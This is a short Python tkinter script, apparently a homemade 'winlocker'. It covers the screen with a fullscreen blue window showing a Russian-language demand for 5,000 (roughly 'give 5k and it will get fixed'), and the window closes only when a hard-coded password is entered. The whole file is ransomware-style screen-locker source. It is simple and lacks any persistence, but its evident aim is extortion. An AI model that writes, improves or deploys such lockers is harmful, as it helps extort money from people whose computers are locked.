import tkinter as tk
def checkpas():
    if entry.get() == "о 5 и он наст":
        root.destroy()


def create_winlocker():
    global root, entry
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.configure(background='blue')
    ladel = tk.Label(root, text="отдай 5к и он починется", font=("Helvetica", 100), fg="white", bg= "blue")
    ladel.pack(expand=True)

    entry = tk.Entry(root, show="*", font=("Helvetica", 24), fg="black", bg="white", width=20)
    entry.pack(pady=20)

    button = tk.Button(root, text="OK", font=("Helventica", 18), command=checkpas)
    button.pack(pady=10)
    root.mainloop()

if __name__ == "__main__":
    create_winlocker()
